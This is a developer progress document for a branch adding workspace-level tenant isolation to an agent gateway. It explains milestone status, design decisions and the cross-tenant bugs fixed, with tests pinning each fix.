# Multi-User Implementation Progress

Branch: `codex/multi-user-foundation`

This file records what is done, what is deliberately not done, and the
decisions a reviewer would otherwise have to reverse-engineer from diffs.
`internal/ownership/catalog.go` remains the machine-checked source of truth for
isolation state; this document explains it.

## Milestone state

| Milestone | Stories | State |
|---|---|---|
| M1 — Tenant kernel | MU-001–005 | Complete |
| M2 — Team identity | MU-006–011 | Complete |
| M3 — Data isolation ✓ | MU-012–019 | MU-012 ✓ MU-013 ✓ MU-014 ✓ MU-018 ✓ MU-019 ✓; MU-015 ✓ (envelope half: versioned per-workspace data keys wrapped by a KeyWrapper a production KMS can implement, rotation without re-encryption, AAD binding each ciphertext to its row; redaction half: one `redact.SecretKeyName` predicate replacing four divergent lists, and three real leaks closed — the Postgres action log never redacted while its single-user twin did, the WebSocket and broker egress paths carried tool arguments verbatim, and plugin dry-runs handed uninstalled code the gateway's whole environment — with an AST guard that classifies every consumer of a `message.Event`); MU-016 ✓ (all six: server-generated object keys, authenticated streaming, containment after `EvalSymlinks`, `internal/safearchive` as the repo's only extractor, expiry as a query predicate, and — the last one — tool subprocesses resolving to the RUN's scratch rather than the workspace tree, so two concurrent runs of one tenant no longer share a working directory); MU-017 ✓ (criterion 5 now closed on both halves — `internal/mcp.Pool` gives each workspace its own MCP subprocesses, rooted in that workspace's own tree with the sandbox rlimits and the environment allow-list, replacing one shared client whose children all started in the gateway's working directory; criterion 1 also closed — the orphaned `plugins.Stores` is wired to the engine's execution path, and every tool subprocess now starts in its own workspace's tree instead of the gateway's working directory, with an AST guard over every `exec.Command` in the runtime; criterion 7 closed by per-workspace loader invalidation on every plugin lifecycle change, so a revoke stops the tool being callable on the next dispatch rather than the next restart) |
| — event spine + stores | (cross-cutting) | Events, action log, learning, Studio traces, workboard, conversation history ✓ |
| — isolation floor | (cross-cutting) | 0 blockers: every declared store is scoped and names a real isolation test |
| M4 — Execution plane | MU-020–025 | MU-020 ✓; MU-021 ✓ (6/7; scalable workers → M6); MU-022 ✓; MU-023 ✓; MU-024 ✓; MU-025 ✓ (4/5; criterion 5 closed now that workspaces have a lifecycle — background jobs revalidate before committing; org sharing deferred with a guard and an explicit decision) |
| M5 — Team Preview | MU-026–032 | MU-026 ✓; MU-027 ✓ (the load profile is data in internal/loadprofile with each target's reasoning beside its number, and `make loadtest` measures the real gateway against it under an open-loop harness); MU-028 ✓ (all 5 criteria); MU-029 ✓ (all 5 criteria); MU-030 ✓ (criterion 1 closed by internal/workspacepolicy: durable per-workspace budgets, quotas and retention that can only TIGHTEN the operator's config; the deployment-wide token quota is single-implementation and enforced by the cost governor); MU-031 ✓ (criterion 4 now keyset-paginated on both trails; the membership page's SQL needs a Postgres instance to exercise, its cursor codec and route behaviour are covered here); MU-032 partial (workspace lifecycle + write admission, the catalog-derived export/deletion plan, the deletion gates, and the asynchronous export job with a self-describing manifest, and the purge executor with a machine-checked coverage list, and the deletion route with its recovery window are closed; the per-resource export emitters and purgers beyond agents/runs/workboard, are outstanding; the sweep, the lease and the deletion routes are closed) |
| M6 — Scale | MU-033–037 | MU-036 mostly ✓ (criterion 2 closed: the `agent` label — a raw user-authored agent ID — and the `tool` label were readable by every workspace admin scraping the shared `/metrics` document, which cannot be scoped per caller; both are now bounded, with a declaration guard, an exposition-rendering guard and a repo-wide call-site guard. Criterion 6 closed via the already-workspace-scoped ops-summary API. Criterion 4 open: tracing is a no-op stub with no OTEL dependency); MU-033 mostly ✓ (criteria 3, 4, 5: `/ready` fails with a status code a load balancer acts on, with requiredness derived from the same deployment rules that gate startup rather than a second list; drain-then-close ordering with a bounded shutdown, replacing an unbounded `Shutdown()` that one streaming run could block forever. Criterion 1 partially met — six in-process state holders named in the write-up); MU-034 mostly ✓ (criteria 1–5: durable runs now carry a renewable lease with owner and expiry, so the startup recovery sweep no longer re-queues runs a live replica is executing — a duplicate-execution bug on every rolling restart; plus the missing DLQ retry, which takes the workspace from the recorded row rather than the replayable payload. criterion 6 closed too: a crashed worker is a worker that stops calling, so each crash point is the production sequence run up to that point and abandoned — no injection points, no subprocesses. The lease is what made it expressible at all); MU-035 partial (criterion 4 closed: `Destructive: true` was an opt-out from the additive-only check and nothing else, so a mistaken DROP was protected by a word — a destructive step now takes a `VACUUM INTO` snapshot first and refuses to run if it cannot; criterion 3's observability half closed by `GET /admin/schema`, which discovers databases rather than enumerating them. RPO/RTO targets, cross-store restore tests and the Postgres migration runner need infrastructure decisions, recorded rather than guessed); MU-037 mostly ✓ (criteria 1, 2, 6: `internal/releasegate` is a machine-checked inventory of every surface the story enumerates, and the Makefile's `security` target is checked against it — the gate ran three packages while thirty had cross-tenant tests, so the coverage was broad and the gate narrow. Widening it to `-race` found a real data race on each of its first two runs: the export handler serialized the same job pointer a background goroutine was mutating, and the cancellation watcher's stop function returned before its goroutine had exited. Load figures, Postgres/object-store restore, chaos coverage and independent review are recorded as declared gaps) |

## Isolation progress

`ownership.MultiUserBlockers()` is the machine-readable list of stores that are
declared workspace-owned but not yet isolated.

- At the start of this work: **57 blockers**
- Now: **0 blockers**

Every store the discovery scan finds is workspace-scoped and names a real
isolation test. `TestLegacyTenantStoresAreExplicitlyBlockedFromMultiUserUse`
used to require blockers to exist — a guard against declaring the work done
early — and is now inverted into
`TestNoStoreRemainsUnscopedForMultiUserUse`, which fails and names any store
that regresses. `TestEveryScopedStoreNamesATestThatExists` checks the other
half: a `Scoped` entry pointing at a file that is not there is a claim with
nothing behind it.

A store moves from `personal-only` to `scoped` only when it has a real
cross-tenant isolation test. The catalog names that test, and a CI check fails
if the named file does not exist.

## Load-bearing decisions

These are the choices that would be easy to undo by accident.

### Ownership is derived from location, not declared in content

Agents, Studio state, and file-backed memory derive their workspace from where
the file sits (`internal/wsroot`). There is deliberately no `workspace_id`
field in `SOUL.yaml`. This makes "a watcher event cannot load an agent into
another workspace" structural rather than a check someone can forget; a test
drops a file into one workspace's directory with `workspace_id:` set to
another and asserts the other still cannot see it.

### The personal workspace never moves, and never re-derives

Product invariant 7 says an existing single-user installation must not notice
that the storage layer became tenant-aware. Two consequences:

1. Personal paths are byte-identical to what they were. Only non-personal
   workspaces are namespaced under `.workspaces/<id>/`.
2. **The personal credential key derivation is frozen.** `deriveInfo` returns
   the original workspace-free HKDF info for the personal workspace. Changing
   it would derive a different key and every credential an existing
   installation already stored would stop decrypting — silently, at the moment
   an agent needed it. `TestPersonalDerivationIsUnchanged` pins this.

### Scoping is by storage, not by filter, wherever possible

One workspace's lessons, memory, and drafts are *different files*; one
workspace's credentials are encrypted under a *different key*. A filter that a
caller can forget to apply is not a boundary. Where a shared table is
unavoidable, the workspace predicate is inside the query rather than applied to
its results.

### Backfills run unconditionally, not only on column creation

A row with an empty `workspace_id` matches no scoped query. That is not a leak
— it is data that has silently disappeared, which is worse and harder to
notice. Migrations therefore re-run the backfill on every open. Reachable by an
interrupted migration or a direct write.

### Cross-tenant scopes can aggregate but cannot resolve

`agentsAcrossWorkspaces()` exists for boot validation and deployment counters.
Its `All()` spans tenants; its `Get()` returns nil. The escape hatch cannot
become a back door into one workspace from another, and every use is greppable.

### Deliberate fail-closed gaps

These are gaps, not oversights, and they fail closed rather than guessing:

- **Scheduler and channel invocations** reach the engine without a request
  principal and resolve to the personal workspace. That is the single-tenant
  answer, not a bypass: a multi-user deployment establishes a service principal
  before the engine is reached.

### Events carry their tenant, and the engine stamps it in one place

`message.Event` gained `WorkspaceID` (append-only, `omitempty`, so an older
consumer keeps decoding unchanged). Everything downstream of the event stream —
the action log, cost accounting, dead letters, the learning collectors — had an
agent ID but no way to know whose agent it was.

`Engine.emit(ctx, ev)` is the single point where events leave the engine, and it
stamps the run's workspace if the event does not already carry one. Every
`sink.Emit` site now routes through it. A new event type added later is
tenant-correct by construction rather than by the author remembering.

This is what let the workflow distiller and strategy-fit collector stop being
pinned to the personal workspace: they observe a hub carrying every tenant's
runs, so they hold a *per-workspace store resolver* rather than a store, and
route each observation by the workspace the event itself declares. A workspace
whose store cannot be built drops the observation rather than falling back —
`TestAnUnresolvableWorkspaceDropsRatherThanFallsBack` pins that, because a
fallback would silently teach one tenant from another's runs.

### The action log is isolated by file *and* by predicate

The log was keyed by agent ID alone — both its per-agent JSONL files and every
SQL predicate — and agent IDs are only unique within a workspace. Two tenants
each running an agent called "assistant" appended to one file, and each tail
returned the other's runs.

Now a tenant's events are a *different file* (`.workspaces/<id>/<agent>.log`;
personal stays at `<agent>.log`), and every durable query carries
`workspace_id` as the leading predicate, matched by workspace-first indexes.
Both backends — SQLite and Postgres — got the same treatment, including the
mirror files Postgres writes.

Three parts are worth not undoing:

1. **`sdk/storage.WorkspaceActionLogBackend`** sits beside the frozen
   `ActionLogBackend`. Callers type-assert; when the assertion fails and the
   workspace is not personal, they return `ErrActionLogNotTenantAware` rather
   than falling back to the unscoped call, which would answer with the personal
   workspace's events.
2. **`internal/gateway/action_scope.go`** is the single place a handler reaches
   history through, mirroring `agentScope` and `studioScope`. Eighteen call
   sites previously took `s.actions` directly; a read can no longer be written
   without naming the tenant.
3. **Boot recovery stays deployment-wide, and stamps instead.**
   `IncompleteMessageIns` must recover every tenant's interrupted runs, so it
   has no scoped twin. Isolation comes from `message.Message` gaining
   `WorkspaceID` and each payload being stamped with the workspace of the row
   it came from, so a replayed run re-enters the engine under its own tenant.
   The stamp merges into the decoded object rather than re-marshalling a typed
   `Message`, so a payload written by a newer binary does not lose fields
   passing through an older one's recovery pass.

`session_search` deserves separate mention: its `agent_id` is model-supplied,
making it the one place a run can name an agent it was not started for. Scoped
to the run's own workspace, naming another tenant's agent now reaches a file
that does not exist.

### Accepting is the dangerous operation, so proposals are isolated by file

A learning proposal is a candidate rule that changes how an agent behaves once
accepted. Reading another tenant's queue would be a leak; *accepting* from it
would be a rule someone else installed. `learning.Stores` gives each workspace
its own JSONL, so a proposal ID belonging to another tenant is simply not in
the file the caller reads and `UpdateStatus` returns `os.ErrNotExist` — the
same answer a genuinely missing ID gives, so IDs cannot be probed.

Nothing can hold "the" proposal store any more: `Engine.SetLearningStore` was
replaced by `SetLearningStores`, and the gateway reaches one through
`s.learningStore(c)`. Deduplication is per workspace too, so two tenants
independently learning the same lesson get two proposals rather than one
suppressing the other's review.

With the store scoped, the **background reflection sweeper** became
multi-tenant: it covers every workspace but touches one at a time, listing,
tailing, and proposing within each. An agent source or tailer without a
tenant-aware surface is treated as single-tenant, and a non-personal workspace
gets nothing rather than the personal workspace's runs —
`TestASingleTenantTailerDoesNotFeedOtherWorkspaces` pins that, because the
fallback would propose one tenant's lessons into another's queue.

### A shared ring can still be structural: put the tenant in the key

Studio build traces are a bounded in-memory ring, and a trace carries the
originating intent — the user's own words — plus a full snapshot of every draft
the loop produced. `Get(id)` had no ownership check, and `Latest()` returned
whichever build was newest across the whole deployment, so one tenant could
read another's in-flight build.

Rather than adding a check to each accessor, the map key became
`{workspaceID, id}`: a foreign id is a *map miss*, indistinguishable from an id
that never existed. `Latest` and `List` read a per-workspace index rather than
filtering a shared list, and the JSONL directory is namespaced too.

The retention cap stays global on purpose, so trace memory does not grow with
the number of tenants. The consequence is stated rather than hidden: a busy
tenant can evict a quiet one's traces early. That costs a debugging aid, never
confidentiality — eviction drops traces, it never exposes them. A test pins
that eviction leaves no per-workspace index pointing at a trace that is gone.

### Children derive ownership from their parent, never declare it

The workboard is four tables — tasks, runs, comments, artifacts — and every ID
in it is a global SQLite autoincrement, so another tenant's ID is always a
plausible one. `GetArtifact(id)` was the sharpest edge: the gateway turns that
row into a file download, so an unscoped lookup handed one tenant both the
existence and the on-disk path of another's output, and then streamed it.

Only `workboard_tasks` gained `workspace_id`. Runs, comments, and artifacts
carry none: every query reaches them through a join to the owning task, so the
child's tenant and the parent's cannot drift apart. A missing row and someone
else's row are the same `ErrNotFound`, so IDs cannot be probed — including the
"already finished" probe in `FinishRun`, which would otherwise confirm whether
a foreign run ID is real.

Two details worth keeping:

- `Delete` deletes the parent **first**, with the tenant predicate. A refused
  delete therefore never reaches the child cascade, so naming another
  workspace's task affects nothing at all.
- `executeWorkboardRun` writes its result from a goroutine that outlives the
  request. It takes the workspace from the captured `Task`, not from the Ctx —
  Fiber recycles that, and this is exactly the use-after-free the AST guard
  exists to catch.

The store refuses an absent workspace outright (`ErrWorkspaceRequired`) rather
than defaulting to personal, because a task with no owner is a task every
tenant can read and edit. That is the opposite of the read paths on stores
whose rows predate tenancy, where an absent workspace legitimately means "the
single-user installation".

### The personal workspace is not partitioned by user

Conversation history is user-private, so it has two boundaries: the tenant and
the person inside it. `Search` was the sharpest edge in the whole store —
`agent_id` is optional, so a blank one meant "every agent", and without a tenant
predicate a single query returned matching *message content* from every
conversation in the deployment.

Both predicates are now mandatory on the cross-session reads (`Search`,
`LoadForAgent`). `Load` takes only the workspace: a session is addressed by an
ID the caller already had to be authorized for, and the gateway gates that with
`session.Ownership`. A second, weaker check in the store would invite callers
to rely on it instead.

**`subjectPredicate` deliberately returns nothing in the personal workspace.**
That workspace has exactly one user — that is what "personal" means — so
partitioning it by subject buys no isolation and actively loses data: rows
written before tenancy carry an empty subject, while a reader today resolves to
whatever local owner ID the deployment assigned. A Personal user would upgrade
and find their own history had vanished from search.
`TestThePersonalWorkspaceIsNotPartitionedBySubject` pins it.

A fork keeps each copied turn's **original** subject rather than re-owning it
to the forker. A fork is a branch of the same conversation; rewriting the owner
would quietly move someone else's turns into another person's private history.

`SubjectFromContext` returning `""` is an answer, not a placeholder: it is the
implicit local user a single-tenant installation has always had, and the value
those rows already carry.

### Spend is rivalrous, so an unscoped budget is a denial of service

Costs are unusual among these stores. Spend is confidential — it reveals
another team's activity, model choices, and volume — but it is also
*rivalrous*: a shared ceiling means the busiest tenant starves the rest, and
one tenant's spend becomes observable to another as rejections.

So the "global" budget scopes are now global *within one workspace*. A
configured daily or monthly ceiling applies per tenant rather than to the
deployment as a whole. In Personal there is exactly one workspace, so the
numbers are identical to what they were.

`token_usage` already had a `workspace` column that `Record` wrote; it was
simply never used as a predicate. `cost_reservations` had none, and that was
the half that mattered.

**The bug this work surfaced is the one worth remembering.** `TryReserve` has
its own INSERT, separate from `Reserve`, and it was still writing reservation
rows without a workspace. A reservation with an empty workspace matches no
scoped capacity read — so it was invisible to the very ceiling it was supposed
to consume, and the budget silently stopped being enforced. That is worse than
a leak: nothing surfaces. An existing concurrency test caught it, and
`TestInFlightReservationsConsumeTheirOwnWorkspacesCeiling` now pins it
directly (verified by reverting the fix and watching it fail).

`cost_reconciliations` is **reclassified, not scoped**. It records a comparison
against the *provider's invoice*, and providers bill the deployment rather than
the tenant. There is no honest way to split one invoice across workspaces, so
scoping it would add fiction rather than isolation. It is now `PlatformGlobal`,
which the catalog's own invariant already permits to stay `personal-only`.
Per-tenant attribution is what `Chargeback` is for, and that one is scoped.

One catalog wrinkle worth knowing: the costs column is named `workspace`, not
`workspace_id`, and `ValidateCatalog` requires the literal `workspace_id` in a
tenant table's `ScopeKey`. Rather than weaken that guard, the entries record
both — `workspace_id (column: workspace)`.

### MU-019: the indirect surfaces

The stores were the easy half. The rest of MU-019 is the surfaces that carry
tenant data without looking like storage.

- **Audit records had stopped reaching their own tenant.** `recordAdminAudit`
  appended events with no workspace, so once audit *reads* became scoped, a
  tenant's own records landed in the personal workspace and vanished from their
  trail. Introduced by the action-log commit and caught while auditing MU-019 —
  the same disappearing-data failure mode, this time self-inflicted.
- **Shares gained the half that was missing.** A published conversation was
  permanent: no listing, no revocation, no audit, and creating one needs only
  `chat:READ`. Now it carries its workspace and creator, expires on read as
  well as by sweep, can be listed and revoked by its owning workspace only, and
  both create and revoke are audited. The count cap became per-workspace —
  a global cap let one tenant's burst evict another's live links, which is a
  lever one tenant could pull against another.
- **`OpsSummary` was aggregating every tenant's runs** behind a tenant-facing
  endpoint. Run counts, failure rates and per-agent failure leaders are exactly
  the operational signal one team should not read about another.
- **Support bundles omit log bodies unless explicitly confirmed**, and now
  redact personal data as well as credentials. Those are different sets, so
  `redact.ValueForExport` is a separate opt-in: losing a password from a
  diagnostic is free, losing a `user_id` would make a bundle useless for
  tracing a run. The persistence path is unchanged.
- **Raw Prometheus is gated in multi-user deployments.** The families carry an
  `agent` label; the registry is process-wide and rendered in one pass, so
  there is no per-caller view and *who may read it* is the only control.
  Personal is untouched — with one workspace the labels identify nobody.

### "Cannot omit" is a guard, not a promise

MU-019 asks that aggregate queries *cannot* omit the workspace predicate.
Per-store tests prove the queries that exist today are scoped; they cannot
prove the next one will be. `TestTenantStoresAreReachedThroughAScopedAccessor`
fails the build when a handler calls `s.actions.X` or `s.costStore.X` directly
instead of through `actionLog(c)` / `costs(c)`, which is the only way a new
read gets written without a tenant. Writes (`Append`) are exempt because the
event carries the workspace itself.

That is why `costScope` exists at all: costs were correctly scoped by passing
`s.costWorkspace(c)` at each call site, and correct-by-convention is exactly
what the guard is there to replace.

### Vector search: isolation and fairness are the same fix

MU-025 says cross-workspace learning must not occur "through aggregate caches
or vector similarity queries". Vector search is the sharpest version of that,
because the wrong fix looks like it works.

A post-filter returns only the caller's rows, so a naive test passes — but the
topK budget was already spent on the neighbour's vectors. A tenant sharing an
index with a busier one then gets few results or none, *and* the neighbour's
memories were read out of the store in order to decide that. The workspace
therefore goes into the pre-filter, beside `agent_id`, which this file already
documented as necessary for the analogous reason.

Qdrant needed one extra wrinkle: points written before tenancy carry no
`workspace_id`, and they belong to personal. A personal search matches the
value *or* an absent field via a `should` OR; no other tenant can reach either
branch.

**The first version of the KNN test did not actually work.** Every vector was
identical, so sqlite-vec returned an arbitrary k and a simulated post-filter
passed by luck. The embedder now places content at controlled distances, and
the test was re-verified by reintroducing a post-filter and watching it fail.
A test that cannot fail is worse than no test, because it manufactures
confidence.

### Deleting evidence reaches what was derived from it

Erasing a conversation has to invalidate the learning that cited it —
otherwise the evidence is gone and the conclusion remains, and a *pending*
proposal could still be accepted into an agent's behaviour afterwards.

The lineage rule is a policy choice, so it is written down rather than
implied:

- **Pending → deleted.** An unreviewed claim whose only support was erased.
- **Accepted → disabled, not deleted.** Someone decided it, and that decision
  is the audit trail for why the agent behaves as it does. Disabling stops the
  effect and keeps the record, with the reason written into the proposal.
- **Rejected → untouched.** It already affects nothing, and removing it would
  lose the "we considered this and said no" signal that stops the same lesson
  being re-proposed.

### An ID is not an authorization

Session attachments were protected only indirectly: the store took an ID and
returned the row, and the one thing between a caller and another tenant's
upload was the gateway remembering to call `requireSession` first. Attachment
IDs are server-generated UUIDs, so this was not trivially exploitable — but it
is ownership by convention, which is what this branch keeps replacing.

`session_resources` now carries `workspace_id`, and the predicate is in the
query. A file another workspace owns reads as absent, the same answer an ID
that never existed gives.

Two details worth keeping:

- **Expiry is a query predicate, not housekeeping.** MU-016 requires that an
  expired artifact stop being downloadable *including through a previously
  issued URL*. Filtering on `expires_at` in `GetAttachment` and
  `ListAttachments` means that happens the moment it expires, rather than
  whenever the 24-hour prune sweep next runs.
- **`expandChatAttachments` takes IDs from the chat request body.** They are
  client-supplied, so the workspace is applied as a store predicate: naming
  another tenant's attachment ID now reaches nothing, instead of being fetched
  and then rejected by a metadata comparison afterwards.

The trap in this change was not the SQL. `attachmentStore` is matched by *type
assertion* in the gateway, so when the store's signatures changed the assertion
simply stopped matching — the build stayed green and attachments would have
started returning 503 at runtime. The existing round-trip tests catch it
because they drive the real store through the HTTP routes; a mock would not
have. The interface now says so in a comment.

### A missed RBAC grant widens access, so key consistency is a security property

This one was a live bug, not a missing boundary.

`rbac_agent_grants` already had `workspace_id` in its primary key — but the
package's own personal constant was `"personal"` while every other store used
`wsroot.PersonalWorkspaceID` (`"ws_personal"`). Separately,
`requestAuthority` had two branches: with a workspace identity it yielded the
identity's workspace, and falling back to JWT claims it dropped the workspace
entirely, normalising to the legacy key.

Both branches are live in one deployment. So a grant written through one
request path was invisible to the other.

What makes that serious rather than merely inconsistent is
`CanAccessAgentInWorkspace`'s fallthrough: a grant is an allow-list that
*narrows* a role, and when the lookup misses the function returns the static
role baseline — which is **broader**. A restrictive grant that stops matching
does not fail closed; it silently restores the permission it was written to
remove.

Fixed on both sides: the claims branch carries `claims.WorkspaceID`, and the
constant is now `wsroot.PersonalWorkspaceID`, with an unconditional migration
that moves legacy `"personal"` rows and drops any that would collide with an
already-migrated row (the row under the current key is the one the live path
has been reading and writing, so it wins).

`TestAMissedGrantWidensAccessRatherThanDenying` states the fallthrough
property directly, so anyone changing the key scheme sees what it costs.

### The SDK is extended additively, never modified

`sdk/storage.MemoryBackend` is documented as frozen per major version, so it
was not touched. `memory.Entry` gained `WorkspaceID` (append-only, omitempty)
and a **new** `WorkspaceMemoryBackend` interface sits beside the frozen one. A
backend that does not implement it keeps working; a caller needing isolation
type-asserts and fails closed.

### For credentials, an unverified request must carry no authority at all

`internal/auth/apikeys` scoped correctly whenever `requestctx` yielded an
identity. The interesting branch was the other one. `visibleKeys`, `mayManage`
and `credentialVisibleTo` each ended with "no identity → allow everything",
and `HandleCreate` fell through to a path that reads `organization_id` and
`workspace_ids` **out of the request body**.

In a personal deployment that fallback is not a bug, it is the deployment:
there is one tenant, requests arrive with no workspace identity as a matter of
course, and every credential really is the caller's own. In a multi-user
deployment the same code hands an unattributed request management of every
credential in the installation — and, through create, the ability to mint a new
owner-role service account bound to a tenant it names itself. Reading someone
else's credential metadata is a leak; issuing a credential into their tenant is
an escalation that outlives the request.

This is the same fail-open shape as the RBAC grant bug above, and the fix is
the same in spirit: keep the behaviour that Personal depends on, and make the
fallback a denial where a workspace identity is actually available to be
required. `NewScopedAPI(store, log, requireIdentity)` sets the flag;
`(*Server).credentialAPI()` derives it from
`config.IsMultiUserMode(s.cfg.DeploymentMode())`, so Personal is byte-identical
to before (invariant 7) and every one of the six credential routes goes through
it rather than constructing its own `apikeys.NewAPI`.

Two details worth keeping:

- The list refusal is **403, not 500**. `visibleKeys` returns
  `ErrIdentityRequired`, and reporting that as a server error would send
  operators looking for an outage when the request was simply unauthorised.
- The denial must not mutate. `TestUnverifiedRequestCarriesNoCredentialAuthority`
  asserts revoke/rotate/status all return 404 *and then re-validates the
  credential*, because a refusal that still withdrew the credential would be
  worse than no refusal at all.

Each guard was verified by removing it individually: without the `mayManage`
guard the unverified caller revokes and suspends another tenant's credential;
without the `HandleCreate` guard the forged request returns **201** with a live
owner-role secret in `org_b`.

### The dead-letter queue is tenant content wearing an admin route's clothes

`dead_letters` is served from `/admin/dlq` behind a config-read grant, which
made it look like operations telemetry. It is not: every row carries the
original job payload, and for an agent run that payload is the user's prompt.
It is the failed half of the same conversation the history store already
scopes, so it is now scoped the same way.

Three things were needed, and only the first is the obvious one.

**The reads.** `workspace_id` column, workspace-first indexes
(`(workspace_id, created_at DESC)` and `(workspace_id, queue, created_at DESC)`
— leading rather than trailing, so the busiest tenant's backlog does not
lengthen anyone else's scan), and the tenant as a positional argument on
`List`, `Get` and `Delete` rather than a value read from a context inside the
store. `Delete` puts the workspace in the DELETE predicate rather than doing a
read-then-delete, because the thing a read-then-delete races on here is the
authority check itself.

**The write.** The primary key is the ID alone, so `INSERT OR REPLACE` was a
cross-tenant *write* path through a store whose every read is scoped: a push
whose ID matched a neighbour's row would overwrite it. Server-generated IDs
make that unreachable today, which is exactly the kind of reasoning that stops
being true after one refactor. It is now
`ON CONFLICT(id) DO UPDATE ... WHERE dead_letters.workspace_id =
excluded.workspace_id`, with `RowsAffected() == 0` reported as an error —
same-workspace re-pushes keep their overwrite semantics (the engine re-pushes
as attempts accumulate), a colliding one across the boundary changes nothing
and says so.

**The push.** `deadLetterStore.PushFailed` gained the workspace as an argument
instead of letting the store infer it. The push happens in a deferred block on
a `context.WithoutCancel` copy after the run has already failed, so making the
tenant explicit keeps the one value that decides who can ever see the entry
visible at the call site rather than buried in whichever context survived.

An unattributed push is normalised to personal, not rejected. Push is the
failure path already — the job has exhausted its retries — so refusing the
insert would turn "we could not attribute this" into "this never happened".
Personal is nobody else's workspace, so a misattributed entry is visible to the
operator rather than leaked to a stranger. The backfill on open follows the
same reasoning: a row with an empty workspace matches no scoped read, so the
operator sees an empty backlog and concludes nothing failed.

### A second AST guard for stores that stay deployment-wide

`TestTenantStoresAreReachedThroughAScopedAccessor` works because for the action
log and the cost store the scoped accessor *is* the store — touching the field
is the violation. The dead-letter queue is one database for the whole
deployment; there is no per-workspace handle to hand back, so the field access
is legitimate and the tenant travels as an argument.

That makes "did you pass a workspace" the property to check, and
`TestSharedStoreReadsNameATenant` checks it: a call to `s.dlqStore.List/Get/
Delete` must pass a call to a recognised scope resolver. A literal `""` in the
workspace position is the mistake it exists to catch — it compiles, it reads
plausibly, and it turns a scoped listing straight back into a deployment-wide
one. Verified by planting exactly that and watching the guard name the file,
line and function.

### Workflow checkpoints are replayed, so a key collision is an injection

`workflow_checkpoints` was keyed on `(agent_id, run_id, step_id)`. Agent IDs
are unique *within* a workspace, not across the deployment — two tenants can
each have an agent called "researcher" — so that triple was not a key, and the
`ON CONFLICT` clause meant a second tenant writing it did not get its own row:
it took over the first tenant's.

What makes this worse than the usual leak is what checkpoints are *for*. The
Restore hook feeds a completed checkpoint's `State` into a resuming run as that
step's own output. A cross-tenant match does not merely show another
workspace's data — it injects it as this run's computation, and whatever the
run does next treats it as its own.

**The key had to widen, which meant a rebuild.** SQLite cannot alter a primary
key in place, and simply adding a column would have left the old three-column
key still enforcing global uniqueness. So v2 is the one `Destructive` migration
in the series. It is safe to be: `MigrateSchema` runs each step in a
transaction, so an interrupted upgrade rolls back to the v1 table with its rows
intact rather than leaving a half-copied one.

The migration renames the old table aside and creates the new one *under the
real name*, rather than building `workflow_checkpoints_v2` and renaming it into
place. Either order works; this one keeps `workflow_checkpoints` the only name
the package ever `CREATE`s, so the ownership catalog's discovery scan does not
see a second durable table and demand a classification and isolation test for a
scratch name that exists only between the ALTER and the DROP. (It did exactly
that on the first attempt — the guard works.)

**One choke point instead of seven literals.** The executor built `Checkpoint`
literals in seven places across `workflow.go` and `flow.go`. A literal that
omits `WorkspaceID` compiles, writes a row, and lands it in the personal
workspace where it can collide with a genuinely personal run — silent in every
way that matters. All seven now go through `w.saveCheckpoint` /
`w.loadCheckpoint`, which stamp the tenant from the run's principal, and
`TestExecutorCheckpointsGoThroughTheStampingHelpers` fails the build if a new
one reaches `w.store` directly.

**The recovery sweep stayed deployment-wide, and says so.** A process-restart
resume has no request and therefore no tenant, so it genuinely has to see every
workspace. `ListInProgress(ctx, workspaceID)` is the scoped read;
`ListInProgressAcrossWorkspaces(ctx)` is the sweep, named so it cannot be
reached by accident, and every row it returns carries its own `WorkspaceID` so
the resumer decides per row instead of inheriting one workspace's context for
all of them.

### Deployment history is isolated by directory, so nothing can forget to filter

`internal/studio/deployrecord.go` was already rooted at a caller-supplied
directory — but the caller was `wire.go`, once, at startup, with the
deployment's own root. Every workspace's histories would have landed in one
directory keyed only by agent ID.

Agent IDs are unique within a workspace, not across the deployment, so that is
not a near miss. Two tenants deploying an agent with the same ID would have
appended to *one history file*: each tenant's version numbers would count the
other's deploys, and `Latest` would return whichever tenant deployed most
recently. The isolation test catches exactly this — with the tenant removed
from the path, the two workspaces' first deployments come back as v1 and v2.

Rollback is the sharp edge. It reads the previous record and re-applies its
`Definition`, which is the full agent including its system prompt. Under a
shared history a rollback would not leak another tenant's prompt, it would
*install* it.

Scoping is by path (`wsroot.Dir`), like `library.go` and `rulesstore.go` before
it: a tenant asking for a neighbour's agent does not get a filtered-out result,
it gets "no such file". Personal resolves to the root itself, so a single-user
installation's files are exactly where they were (invariant 7), and the test
asserts both that and the absence of a namespace directory.

The readiness gate needed the same treatment from the other side. The
scheduler's verdict must be read from the workspace the run will *execute* in,
or one tenant's certification could clear another tenant's identically-named
agent to fire on a schedule. `deploymentReadinessGate` now takes
`sched.PrincipalWorkspace` as a function rather than a captured value, so the
verdict and the run can never be read from different workspaces.

### A note on an assertion that was theatre

The first version of the directory test asserted "no `.tmp` files left in the
shared root". It passes whether or not the write is namespaced — the temp file
is renamed away on success and removed on every error path — so it proved
nothing. It now asserts the shared root contains the namespace directory *and
nothing else*, which is actually observable. Worth recording because a test
that cannot fail is worse than no test: it reads like coverage.

### A rulebook lock is a control, so its key is a mutual-exclusion domain

`internal/agentmemory` keeps everything under `<baseDir>/<agentID>/`, plus a
single `rulebook.db` holding `rulebook_versions` keyed `(agent_id, version)`
and `rulebook_locks` keyed on `agent_id` alone. Agent IDs are unique within a
workspace, not across the deployment, so a shared base directory meant two
tenants with an agent called "researcher" appended to one episodic log,
overwrote one `procedural.md`, and continued each other's version numbering —
the isolation test shows the second workspace's *first* rulebook version being
numbered 3.

The lock is the part that is not an information-disclosure bug at all. A lock
refuses every write to an agent's rules, automatic and manual. Under one shared
table, freezing an agent in one workspace freezes the identically-named agent
in every other workspace, and a stranger's unlock silently thaws yours. The key
of a lock is also its mutual-exclusion domain, so getting the key wrong is a
control-plane failure, not a privacy one: it hands one tenant a switch on
another tenant's agent behaviour.

There was no predicate to add — every method here is keyed by agent ID and has
nowhere to put a tenant — so isolation is by root directory: one
`CompositeStore` per workspace, each with **its own `rulebook.db`**, which puts
the lock domain inside the tenant boundary by construction. Personal resolves
to the original base, so a single-user installation's files do not move.

Three details worth keeping:

- **A workspace whose directory cannot be created gets `nil`, not the shared
  base.** Callers already treat nil as "brain memory is off" and skip. Falling
  back would file one tenant's task history under another's, which is worse
  than the feature being unavailable.
- **`Engine.BrainStore()` was deleted rather than kept alongside a scoped
  variant.** `BrainStoreInWorkspace(workspaceID)` is the only accessor, so
  there is no unscoped call for a new handler to reach for — a stronger
  guarantee than a test that notices afterwards.
- **`applyLearningProposal` gained the request.** Accepting a proposal
  *writes*: a procedure proposal appends to the agent's rulebook, a semantic
  one writes a memory record. The target has to be the workspace of the person
  accepting it, not whatever the process last had lying around.

